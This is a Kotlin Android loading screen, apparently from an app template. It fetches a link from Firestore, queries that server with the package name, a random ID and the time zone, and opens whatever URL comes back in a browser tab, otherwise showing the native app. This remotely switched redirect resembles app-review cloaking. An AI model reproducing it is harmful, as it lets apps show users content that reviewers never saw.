package com.template

import android.Manifest
import android.content.Context
import android.content.Intent
import android.content.SharedPreferences
import android.content.pm.PackageManager
import android.net.ConnectivityManager
import android.net.Uri
import android.os.Build
import android.os.Bundle
import android.webkit.WebView
import android.widget.Toast
import androidx.activity.result.contract.ActivityResultContracts
import androidx.annotation.RequiresApi
import androidx.appcompat.app.AppCompatActivity
import androidx.browser.customtabs.CustomTabColorSchemeParams
import androidx.browser.customtabs.CustomTabsIntent
import androidx.core.content.ContextCompat
import androidx.lifecycle.lifecycleScope
import com.google.firebase.firestore.FirebaseFirestore
import com.google.firebase.ktx.Firebase
import com.google.firebase.messaging.ktx.messaging
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.launch
import java.util.TimeZone
import java.util.UUID

class LoadingActivity : AppCompatActivity() {

    @RequiresApi(Build.VERSION_CODES.M)
    private val requestPermissionLauncher = registerForActivityResult(
        ActivityResultContracts.RequestPermission(),
    ) { isGranted: Boolean ->
        if (isGranted) {
            Toast.makeText(this, "Notifications permission granted", Toast.LENGTH_SHORT).show()
        } else {
            Toast.makeText(this, "Notifications permission is not granted", Toast.LENGTH_SHORT).show()
        }
    }

    private var isFirestoreUrlNullOrEmpty = false
    private var isFinalUrlExist = false

    private val finalUrlPreferences by lazy {
        getSharedPreferences(APP_PREFERENCES, Context.MODE_PRIVATE)
    }

    private val domenFromFirebase by lazy {
        readDataFromFirestore((application as App).firestoreDb)
    }

    @RequiresApi(Build.VERSION_CODES.M)
    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)
        setContentView(R.layout.activity_loading)

        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU) {
            checkNotificationPermission()
        } else {
            startFirestoreCheck()
        }
    }

    @RequiresApi(Build.VERSION_CODES.M)
    private fun startFirestoreCheck() {
        val isNetworkActive =
            (getSystemService(Context.CONNECTIVITY_SERVICE) as ConnectivityManager)
                .activeNetwork

        if (isNetworkActive == null) {
            startActivity(Intent(this, MainActivity::class.java))
            return
        }

        if (finalUrlPreferences.contains(URL)) {
            val url = finalUrlPreferences.getString(URL, "")
            startChromeCustomTabs(url!!)
        }

        if (isFirestoreUrlNullOrEmpty) {
            preferencesEdit(
                finalUrlPreferences,
                IS_FIRESTORE_URL_NULL_OR_EMPTY,
                isFirestoreUrlNullOrEmpty
            )
            startActivity(Intent(this, MainActivity::class.java))
        } else {
            if (isFinalUrlExist) {
                preferencesEdit(finalUrlPreferences, IS_FINAL_URL_EXIST, isFinalUrlExist)
                val url = finalUrlPreferences.getString(URL, "")
                startChromeCustomTabs(url!!)
            } else {
                readDataFromFirestore((application as App).firestoreDb)
            }
        }
    }

    private fun readDataFromFirestore(firestoreDb: FirebaseFirestore) {
        firestoreDb
            .collection("database")
            .document("check")
            .get()
            .addOnSuccessListener { document ->
                if (document != null) {
                    isFirestoreUrlNullOrEmpty = false
                    preferencesEdit(
                        finalUrlPreferences,
                        IS_FIRESTORE_URL_NULL_OR_EMPTY,
                        isFirestoreUrlNullOrEmpty
                    )
                    val domenFromFirebase = document.get("link").toString()
                    startByUrl(domenFromFirebase)
                } else {
                    isFirestoreUrlNullOrEmpty = true
                    preferencesEdit(
                        finalUrlPreferences,
                        IS_FIRESTORE_URL_NULL_OR_EMPTY,
                        isFirestoreUrlNullOrEmpty
                    )
                    startActivity(Intent(this, MainActivity::class.java))
                }
            }
    }

    private fun startByUrl(domenFromFirebase: String) {
        val userAgent = WebView(this).settings.userAgentString
        lifecycleScope.launch(Dispatchers.IO) {
            val retofitClient = RetrofitService
                .getClient(domenFromFirebase, userAgent)
                .create(RetrofitClient::class.java)

            val call = retofitClient.getUrl(
                packageName = packageName,
                userId = "${UUID.randomUUID()}",
                timeZone = TimeZone.getDefault().id
            )

            val response = call.execute()

            if (response.isSuccessful) {
                isFinalUrlExist = true
                val url = response.body()
                finalUrlPreferences.edit()
                    .putString(URL, url)
                    .putBoolean(IS_FINAL_URL_EXIST, isFinalUrlExist)
                    .apply()

                startChromeCustomTabs(url!!)
            } else {
                isFirestoreUrlNullOrEmpty = true
                preferencesEdit(
                    finalUrlPreferences,
                    IS_FIRESTORE_URL_NULL_OR_EMPTY,
                    isFirestoreUrlNullOrEmpty
                )
                startActivity(Intent(this@LoadingActivity, MainActivity::class.java))
            }
        }
    }

    private fun startChromeCustomTabs(url: String) {
        val customTabsIntent = CustomTabsIntent.Builder()
            .setDefaultColorSchemeParams(
                CustomTabColorSchemeParams.Builder()
                    .setToolbarColor(
                        ContextCompat.getColor(this, R.color.black)
                    ).build()
            ).build()
        customTabsIntent.launchUrl(this, Uri.parse(url))
        LoadingActivity().finish()
    }

    private fun preferencesEdit(
        preferences: SharedPreferences,
        variableName: String,
        variable: Boolean
    ) {
        preferences.edit()
            .putBoolean(variableName, variable)
            .apply()
    }


    private fun checkNotificationPermission() {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU) {
            if (ContextCompat.checkSelfPermission(
                    this,
                    Manifest.permission.POST_NOTIFICATIONS
                ) ==
                PackageManager.PERMISSION_GRANTED
            ) {
                Firebase.messaging
                startFirestoreCheck()
            } else {
                requestPermissionLauncher.launch(Manifest.permission.POST_NOTIFICATIONS)
                startFirestoreCheck()
            }
        }
    }

    companion object {
        const val APP_PREFERENCES = "APP_PREFERENCES"
        const val URL = "URL"
        const val IS_FINAL_URL_EXIST = "IS_FINAL_URL_EXIST"
        const val IS_FIRESTORE_URL_NULL_OR_EMPTY = "IS_FIRESTORE_URL_NULL_OR_EMPTY"
    }
}